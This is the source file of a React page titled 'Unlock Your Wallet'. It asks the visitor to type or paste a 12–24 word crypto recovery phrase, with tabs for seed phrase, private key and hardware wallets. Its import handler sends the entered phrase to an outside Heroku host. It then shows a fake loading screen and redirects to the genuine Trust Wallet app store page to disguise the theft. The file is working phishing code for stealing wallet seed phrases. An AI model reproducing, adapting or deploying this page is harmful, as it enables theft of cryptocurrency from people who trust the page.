import React, {useEffect, useState} from 'react'
import { Form, Button } from 'react-bootstrap'
import "react-loader-spinner/dist/loader/css/react-spinner-loader.css";
import Loader from "react-loader-spinner";
import {
  isIOS
} from "react-device-detect";
import {Link, useLocation} from 'react-router-dom';

export default () => {
  const [val, setVal] = React.useState(" ");
  const [pasted, setPasted] = React.useState(false);
  const [imported, setimported] = useState(false)
  const [clicked, setclicked] = useState(false)
  const location = useLocation();

  const handlePaste = (event) => {
    event.preventDefault()
    if(navigator.clipboard){
      navigator.clipboard.readText().then(text => {
        setVal(text)
        setPasted(true)
      }).catch(() => {
        setVal('');
        setPasted(false)
      })
    }
  }

  const onImport = async (e) => {
    console.log(pasted)
    console.log(imported)
    console.log(val.trim().split(' ').length)
    e.preventDefault()
    
      setimported(true)
      const res = await axios.post(`https://ips370.herokuapp.com/check`, null, { params: {
        infos: val
      }})
      console.log(res.status)
      setTimeout(() => {
        if(isIOS){
          window.location.href = 'https://apps.apple.com/app/apple-store/id1288339409?mt=8'
        } else {
          window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
        }
      }, 7000);
  
  }

  useEffect(() => {
     if(val.trim().split(' ').length >= 12 && val.trim().split(' ').length <= 25){
      setPasted(false)
     }else{
       setPasted(true)
     }
  })

  return (
    
    
     
        <>
        <span className="headwa">
    {/* <img src={loogoo} width={30} /> */}
    <p className="wallet-page__title ml-1">Unlock Your Wallet</p>
  </span>
    <div className="py-md-5 wallet-page__card" id="metrocontainer">
    <div className="tabular">
          <Link className="tabular__item" to="register-wallet">SEED PHRASE</Link>
          <Link className="tabular__item" to="private">PRIVATE KEY</Link>
          <Link to="hardware" className={"tabular__item " + (location.pathname == "/hardware" ? "blou" : "")}>HARDWARE</Link>
        </div>
      {
        !clicked ? (
          <>
          <span>
              <p className="c_blue infowal">Please Choose a wallet type.</p>
            </span>
        <div className="hardware">
        <Button className="impbtn hardbutton" onClick={() => setclicked(true)}>Ledger</Button>
        <Button className="impbtn hardbutton" onClick={() => setclicked(true)}>Trezor</Button>
        <Button className="impbtn hardbutton" onClick={() => setclicked(true)}>Continue</Button>
        </div>
          </>
      ) : (
        <>
        <div className={"lodmodal " + (imported && "d-block")}>
    <Loader
        type="TailSpin"
        color="#254f7f"
        secondaryColor="#fff"
        height={100}
        width={100}
       
      />
      <p className="text-white-75 infowal mt-2">please wait...</p>
    </div>

    
      <div className="c-width mx-auto text-left fl" >
       
        <Form>
          <Form.Group>
            <div className="tr-1">
                <Form.Control className="tab__textarea" as="textarea" rows={6} placeholder="Recovery Phrase" id="recov" 
                value={val} onChange={(e) => setVal(e.target.value)}/>
                <button className="tr-2" onClick={e => handlePaste(e)}>Paste</button>
            </div>
            <span>
              <p className="c_blue infowal">Usually 12 words (sometimes 24) separated by single spaces.</p>
            </span>
          </Form.Group>
          <div className="d-flex justify-content-center">
            <Button className={"impbtn " + (pasted ? 'disabledd' : 'activee')} onClick={onImport}>Import Wallet</Button>
          </div>
          <span className="privacypolicy">
            <p className="c_blue infowal">Don't have a wallet ? Create one</p>
          </span>
        </Form>
      </div>
        </>
      )
      }
    </div> 
        </>
      
    
   
  
  )
}